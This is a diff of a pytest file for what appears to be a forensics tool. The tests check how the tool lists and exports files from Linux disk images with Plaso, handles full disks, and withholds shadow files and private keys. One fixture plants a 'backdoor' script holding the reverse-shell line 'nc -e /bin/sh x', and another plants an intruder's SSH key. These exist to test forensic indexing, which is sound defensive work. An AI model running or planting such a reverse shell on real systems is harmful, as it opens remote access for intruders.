@@ -6,17 +6,22 @@ psort writes one JSON event per line with a path specification only for
 files; image_export matches each path segment whole and without case, stores
 some characters of a name as ``_``, and stops for good at a directory it
 cannot read to the end; log2timeline only counts such a directory as a
-warning, which pinfo then names.
+warning, which pinfo then names. log2timeline and psort exit 0 on an image
+they read, and a psort that runs out of space exits 1 with part of its output
+written.
 """
 
 from __future__ import annotations
 
+import errno
 import json
 import os
 import re
+import shutil
 import subprocess
 from collections.abc import Iterator
 from pathlib import Path
+from types import SimpleNamespace
 from typing import Any
 from unittest.mock import MagicMock
 
@@ -35,6 +40,8 @@ from mulder.server.tools import linux
 ROOT = "p5/lvm1"
 HOME = "p5/lvm2"
 MODIFIED = 1_570_274_078  # 2019-10-05T11:14:38Z
+TIMES = "2019-10-05T11:14:38Z\t-\t2016-04-03T16:05:51Z\t2019-10-06T08:00:00Z"
+"""Modified, changed, created and accessed, as a row of the listing shows them."""
 
 
 def _arg(argv: list[str], flag: str) -> str:
@@ -66,6 +73,7 @@ def _events(
     return [
         {**base, "timestamp": modified * 1_000_000, "timestamp_desc": "Content Modification Time"},
         {**base, "timestamp": 1_459_699_551_000_000, "timestamp_desc": "Creation Time"},
+        {**base, "timestamp": 1_570_348_800_000_000, "timestamp_desc": "Last Access Time"},
     ]
 
 
@@ -78,7 +86,8 @@ class FakePlaso:
         self.events += list(extra)
         self.calls: list[list[str]] = []
         self.filters: dict[str, list[str]] = {}
-        self.fail = ""
+        self.broken = ""
+        """The tool that writes half of its output and exits 1."""
         self.leak: list[str] = []
         self.unreadable: dict[str, str] = {}
         """Directory to the first of its names that cannot be read: nothing from it on."""
@@ -94,8 +103,6 @@ class FakePlaso:
         tool = Path(argv[0]).name
         out = ""
         if tool == "log2timeline":
-            if self.fail:
-                return subprocess.CompletedProcess(argv, 1, stdout=self.fail, stderr="")
             if self.encrypted and _arg(argv, "--partitions") == "all":
                 said = "Unable to proceed. Encrypted volume found but no mediator to determine\n"
                 return subprocess.CompletedProcess(argv, 1, stdout=said, stderr="")
@@ -104,8 +111,10 @@ class FakePlaso:
                 count = len(self.unreadable)
                 out = f"Number of warnings generated while extracting events: {count}.\n"
         elif tool == "psort":
-            lines = "\n".join(json.dumps(e) for e in self.events)
-            Path(_arg(argv, "-w")).write_text(lines, encoding="utf-8")
+            # In time order, as psort writes: cut short, it is the newest that are missing.
+            events = sorted(self.events, key=lambda e: e.get("timestamp", 0))
+            lines = [json.dumps(e) for e in events[: len(events) // (2 if self.broken else 1)]]
+            Path(_arg(argv, "-w")).write_text("\n".join(lines), encoding="utf-8")
         elif tool == "pinfo":
             specs = {
                 "type: OS, location: /evidence/disk.E01\ntype: EWF\n"
@@ -135,6 +144,9 @@ class FakePlaso:
                         stored.write_bytes(data)
         else:
             raise AssertionError(f"unexpected command: {argv}")
+        if tool == self.broken:
+            said = "OSError: [Errno 28] No space left on device\n"
+            return subprocess.CompletedProcess(argv, 1, stdout=out, stderr=said)
         return subprocess.CompletedProcess(argv, 0, stdout=out, stderr="")
 
     @staticmethod
@@ -159,6 +171,8 @@ def case(
     monkeypatch.setattr(app, "_ctx", ctx)
     monkeypatch.setattr(app, "_cfg", app.ServerConfig(db_dir=tmp_path / "cases"))
     monkeypatch.setattr(linux, "_find_plaso_cmd", lambda tool: [f"/usr/bin/{tool}"])
+    # Whatever the machine the tests run on has free in its temporary directory.
+    monkeypatch.setattr(shutil, "disk_usage", lambda path: SimpleNamespace(free=10**12))
     monkeypatch.setattr(linuxvol, "scan", lambda image: Scan())
     dirroot.refresh()
     yield tmp_case_db
@@ -221,10 +235,11 @@ def test_every_entry_is_listed_with_its_volume_and_its_times(
     assert result["entries_listed"] == 15 and result["listing_truncated"] is False
     assert result["status"] == "exported" and result["listing_incomplete"] == []
     listing = _text(case, "linux.filelist")
-    assert listing.startswith("volume\ttype\tmode\tuid\tgid\tsize\tmodified\tchanged\tcreated\t")
-    row = "p5/lvm1\tfile\t0644\t0\t0\t10\t2019-10-05T11:14:38Z\t-\t2016-04-03T16:05:51Z\t"
-    assert row + "/etc/passwd\n" in listing
-    assert "p1\tfile\t0644\t0\t0\t10\t2019-10-05T11:14:38Z\t-\t" in listing
+    assert listing.startswith(
+        "volume\ttype\tmode\tuid\tgid\tsize\tmodified\tchanged\tcreated\taccessed\tpath\n"
+    )
+    assert f"p5/lvm1\tfile\t0644\t0\t0\t10\t{TIMES}\t/etc/passwd\n" in listing
+    assert f"p1\tfile\t0644\t0\t0\t10\t{TIMES}\t/grub/grub.cfg\n" in listing
     # A link has no path specification: it is on the volume its directory's files are on.
     assert re.search(r"^p5/lvm1\tlink\t.*\t/etc/rc2\.d/S20ssh$", listing, re.MULTILINE)
     # Nothing says which volume an empty top-level directory is on, and none is guessed.
@@ -265,9 +280,7 @@ def test_a_streams_events_inside_a_file_are_not_entries(
     result = _run(monkeypatch, fake, image)["results"]
 
     assert result["entries_listed"] == 1
-    assert "\t10\t2019-10-05T11:14:38Z\t-\t2016-04-03T16:05:51Z\t/var/log/syslog.1.gz" in _text(
-        case, "linux.filelist"
-    )
+    assert f"\t10\t{TIMES}\t/var/log/syslog.1.gz" in _text(case, "linux.filelist")
 
 
 def test_a_listing_past_the_limit_is_cut_and_says_so(
@@ -424,8 +437,11 @@ def test_var_and_var_log_on_volumes_of_their_own_still_yield_their_logs(
         "p5/lvm4": {"/data/blob.bin": b"\x00", "/etc/motd": b"another root?\n"},
         "p5/lvm5": {"/bob/.profile": b"x\n"},
         "p5/lvm6": {"/carol/.profile": b"y\n"},
+        # A database's data volume: a directory named journal does not make it /var/log.
+        "p5/lvm7": {"/journal/WiredTigerLog.0000000001": b"\x00", "/WiredTiger.wt": b"\x00"},
     }
     files["p5/lvm2"]["/log/placeholder"] = b""  # the mount point of the third volume
+    files["p5/lvm2"]["/cache/man/index.db"] = b"\x00"
 
     result = _run(monkeypatch, FakePlaso(files), image)["results"]
 
@@ -449,8 +465,125 @@ def test_var_and_var_log_on_volumes_of_their_own_still_yield_their_logs(
         "read as /home, guessed from the dotfiles in its directories",
         "read as /home, guessed from the dotfiles in its directories (another volume has "
         "that place, so its files are under its own name)",
+        "mount point not recognised: read as a root volume",
     ]
     assert "exported to p5_lvm6/" in result["volumes"][5]
+
+
+def test_a_mount_point_is_guessed_from_two_signs_not_one() -> None:
+    """One name is a database's journal directory, an application's log, a user called secure."""
+    guess = linux._mount
+    assert guess({"journal/WiredTigerLog.0000000001", "WiredTiger.wt"})[0] is None
+    assert guess({"log/app.log", "lib/app.jar", "bin/run.sh", "conf/app.conf"})[0] is None
+    assert guess({"secure/.bashrc", "bob/.bashrc"})[0] == "home/"
+    assert guess({"wtmp", "messages", "secure"})[0] == "var/log/"
+    # /var with /var/log on a volume of its own: its log directory holds no file.
+    assert guess({"lib/rpm/Packages", "cache/dnf/x", "spool/cron/root"})[0] == "var/"
+
+
+def test_a_file_under_a_mount_point_gives_way_to_the_mounted_volumes(
+    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Written before the volume was mounted, or hidden there: the running system showed it not."""
+    files = {
+        ROOT: {
+            "/etc/passwd": b"x\n",
+            "/var/log/auth.log": b"under the mount point\n",
+            "/home/alice/.bashrc": b"under the mount point\n",
+            "/home/alice/.bash_logout": b"only on the root volume\n",
+        },
+        "p5/lvm3": {"/auth.log": b"Oct  5 sshd\n", "/wtmp": b"\x00"},
+        HOME: {"/alice/.bashrc": b"alias l=ls\n"},
+    }
+    fake = FakePlaso(files)
+
+    result = _run(monkeypatch, fake, image)["results"]
+
+    root = Path(result["export_root"])
+    assert (root / "var/log/auth.log").read_bytes() == b"Oct  5 sshd\n"
+    assert (root / "home/alice/.bashrc").read_bytes() == b"alias l=ls\n"
+    assert (root / "home/alice/.bash_logout").read_bytes() == b"only on the root volume\n"
+    (reason,) = [r for r in result["not_exported"] if r.startswith("under a mount point")]
+    assert result["not_exported"][reason] == [
+        "p5/lvm1:/var/log/auth.log",
+        "p5/lvm1:/home/alice/.bashrc",
+    ]
+    assert result["status"] == "exported" and "p5/lvm1 (EXT, 4 files, 2 exported" in str(result)
+    assert not any("another file's too" in r for r in result["not_exported"])
+
+    # A file hidden under a mount point is worth reading: by its own path it is alone.
+    asked = _run(monkeypatch, fake, image, paths=["/var/log/auth.log"])["results"]["requested"]
+    assert Path(asked["exported"][0]).read_bytes() == b"under the mount point\n"
+
+
+def test_password_hashes_on_a_volume_mounted_at_var_are_not_exported_on_request(
+    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """There the file is /backups/shadow.bak: the name is checked with the volume's place."""
+    var = {
+        "/lib/dpkg/status": b"Package: x\n",
+        "/cache/man/index.db": b"\x00",
+        "/spool/cron/crontabs/root": b"@reboot /x\n",
+        "/backups/shadow.bak": b"root:$6$salt$hash:19000:0:99999:7:::\n",
+        "/backups/gshadow.bak": b"root:*::\n",
+        "/backups/passwd.bak": b"root:x:0:0::/root:/bin/sh\n",
+    }
+    fake = FakePlaso({ROOT: {"/etc/passwd": b"x\n"}, "p5/lvm2": var})
+    _run(monkeypatch, fake, image)
+
+    asked = _run(monkeypatch, fake, image, paths=["/backups/shadow.bak", "/backups"])
+    requested = asked["results"]["requested"]
+
+    assert _held(Path(requested["root"])) == ["var/backups/passwd.bak"]
+    assert requested["not_exported"] == {
+        "not exported (password hashes and private keys, by name)": [
+            "p5/lvm2:/backups/gshadow.bak",
+            "p5/lvm2:/backups/shadow.bak",
+        ]
+    }
+    assert not any("shadow" in p for p in fake.filters["p5/lvm2"])
+    # Nor from a volume whose place is not known, where no prefix can be added.
+    assert linuxvol.SECRET_FILES.search("backups/shadow.bak")
+    assert not linuxvol.SECRET_FILES.search("backups/passwd.bak")
+
+
+def test_what_an_account_leaves_in_its_home_is_exported_wherever_the_home_is(
+    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """mail with /var/mail and a shell, php with /usr/php: not under /home, and the intruder's."""
+    homes = {
+        "/etc/passwd": b"mail:x:8:8:mail:/var/mail:/bin/bash\nphp:x:999:999::/usr/php:/bin/bash\n",
+        "/var/mail/.bash_history": b"sudo su -\npasswd php\n",
+        "/usr/php/.bashrc": b"alias l=ls\n",
+        "/usr/php/.profile": b"umask 022\n",
+        "/usr/php/.viminfo": b"# viminfo\n",
+        "/usr/php/bin/php": b"\x7fELF",
+        "/var/lib/postgresql/.ssh/authorized_keys": b"ssh-ed25519 AAAA intruder@kali\n",
+        "/var/lib/postgresql/.ssh/id_ed25519": b"-----BEGIN OPENSSH PRIVATE KEY-----\n",
+        "/var/lib/postgresql/.psql_history": b"select 1;\n",
+        "/var/lib/postgresql/14/main/PG_VERSION": b"14\n",
+        "/srv/git/.config/systemd/user/sync.service": b"[Service]\nExecStart=/tmp/x\n",
+        "/var/keys/deploy/authorized_keys": b"ssh-rsa AAAA deploy@ci\n",
+    }
+    result = _run(monkeypatch, FakePlaso({ROOT: homes}), image)["results"]
+
+    assert _held(Path(result["export_root"])) == [
+        "etc/passwd",
+        "srv/git/.config/systemd/user/sync.service",
+        "usr/php/.bashrc",
+        "usr/php/.profile",
+        "usr/php/.viminfo",
+        "var/keys/deploy/authorized_keys",
+        "var/lib/postgresql/.psql_history",
+        "var/lib/postgresql/.ssh/authorized_keys",
+        "var/mail/.bash_history",
+    ]
+    assert result["selected"]["homes"] == 8
+    assert result["not_exported"] == {
+        "not exported (password hashes and private keys, by name)": [
+            "p5/lvm1:/var/lib/postgresql/.ssh/id_ed25519"
+        ]
+    }
 
 
 def test_a_single_file_system_needs_no_volume_selector(
@@ -765,6 +898,93 @@ def test_plaso_missing_or_a_directory_given_is_said_plainly(
     assert fake.calls == []
 
 
+@pytest.mark.parametrize("tool", ["log2timeline", "psort"])
+def test_a_listing_pass_that_fails_is_an_error_whatever_it_had_written(
+    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, tool: str
+) -> None:
+    """psort out of temporary space leaves the older half of the events: /etc/passwd may be gone.
+
+    Indexed as a listing, that is an export with status "exported" that lacks
+    the root volume, and a second call answers "already exported".
+    """
+    fake = FakePlaso(SERVER)
+    fake.broken = tool
+
+    result = _run(monkeypatch, fake, image)
+
+    assert result["status"] == "error" and result["error_type"] == "unreadable"
+    assert f"{tool} exited 1" in result["error_message"]
+    assert "No space left on device" in result["error_message"]
+    assert "for that reason alone" in result["suggestion"]
+    assert not fake.ran("image_export") and case.get_sources() == []
+    home = export_dir(case_extract_dir(tmp_path / "cases", "test-case"), image).parent
+    assert not home.exists()
+
+    fake.broken = ""  # with room, the same call lists and exports
+    assert _run(monkeypatch, fake, image)["results"]["status"] == "exported"
+
+
+def test_no_listing_is_started_without_temporary_space_for_it(
+    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Short of space log2timeline neither fails nor finishes: it waits out its timeout."""
+    fake = FakePlaso(SERVER)
+    first = _run(monkeypatch, fake, image)["results"]
+    calls = len(fake.calls)
+    monkeypatch.setattr(shutil, "disk_usage", lambda path: SimpleNamespace(free=10**8))
+
+    result = _run(monkeypatch, fake, image, force=True)
+
+    assert result["error_type"] == "no_space" and "95 MiB free" in result["error_message"]
+    assert "not examined" in result["suggestion"] and len(fake.calls) == calls
+    # What an earlier call exported is still there, and needs no listing to be read again.
+    assert _run(monkeypatch, fake, image)["results"] == {**first, "status": "already exported"}
+
+
+def test_an_export_that_cannot_be_written_is_an_error_not_an_exception(
+    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    def full(*args: object, **kwargs: object) -> None:
+        raise OSError(errno.ENOSPC, "No space left on device")
+
+    monkeypatch.setattr(linux, "_export", full)
+
+    result = _run(monkeypatch, FakePlaso(SERVER), image)
+
+    assert result["error_type"] == "write_failed" and "No space left" in result["error_message"]
+    home = export_dir(case_extract_dir(tmp_path / "cases", "test-case"), image).parent
+    assert not (home / EXPORT_MARKER).exists(), "nothing says the image was exported"
+    # However long the image's name, its directory can be created.
+    long_name = str(Path(image).with_name("L" * 246 + ".raw"))
+    assert len(export_dir(tmp_path, long_name).parent.name.encode()) <= 255
+    assert (
+        len(export_dir(tmp_path, long_name.replace("L", "\U0001f4be")).parent.name.encode()) <= 255
+    )
+
+
+def test_the_same_directory_on_two_volumes_is_two_rows(
+    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A directory's events name no volume: the inode keeps one /lib's times off the other's."""
+    files = {
+        ROOT: {"/etc/passwd": b"x\n", "/lib/x.so": b"\x7fELF"},
+        "p5/lvm2": {"/lib/dpkg/status": b"Package: x\n", "/cache/man/index.db": b"\x00"},
+    }
+    first = [{**e, "inode": "16"} for e in _events("/lib", kind="directory")]
+    second = [
+        {**e, "inode": "14"} for e in _events("/lib", kind="directory", modified=MODIFIED + 60)
+    ]
+
+    result = _run(monkeypatch, FakePlaso(files, first + second), image)["results"]
+
+    rows = re.findall(r"^\?\tdirectory\t.*\t/lib$", _text(case, "linux.filelist"), re.MULTILINE)
+    assert len(rows) == 2 and result["entries_listed"] == 6
+    assert sorted(row.split("\t")[6] for row in rows) == [
+        "2019-10-05T11:14:38Z",
+        "2019-10-05T11:15:38Z",
+    ]
+
+
 # --- later calls -----------------------------------------------------------
 
 
@@ -809,6 +1029,25 @@ def test_a_listed_file_is_exported_on_request_without_listing_again(
     again = _run(monkeypatch, fake, image, paths=["/nope", "/usr/bin/python3", "/opt/app/"])
     assert again["results"]["requested"]["root"] == str(more)
     assert sorted(p.name for p in more.parent.iterdir()) == [more.name]
+
+
+def test_files_asked_for_are_indexed_as_part_of_a_linux_tree(
+    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Their directory holds no etc/passwd, and their names no extension to go by."""
+    files = {ROOT: {**SERVER[ROOT], "/usr/local/bin/backdoor": b"#!/bin/sh\nnc -e /bin/sh x\n"}}
+    fake = FakePlaso(files)
+    asked = _run(monkeypatch, fake, image, paths=["/usr/local/bin"])["results"]["requested"]
+    assert "etc/passwd" not in _held(Path(asked["root"]))
+
+    with pytest.MonkeyPatch.context() as patched:
+        patched.setattr("mulder.server.tools.extract.app_files.shutil.which", lambda name: name)
+        indexed = _tool_dispatch_sync["index_app_files"](
+            case_id="test-case", image_path=asked["root"], directory_pattern="usr/local/bin"
+        )["results"]
+
+    assert indexed["extensions_used"] == ["*"] and indexed["files_indexed"] == 1
+    assert "nc -e /bin/sh" in _text(case, "appfiles.usr.local.bin.backdoor")
 
 
 def test_a_later_export_does_not_renumber_the_rows_already_indexed(
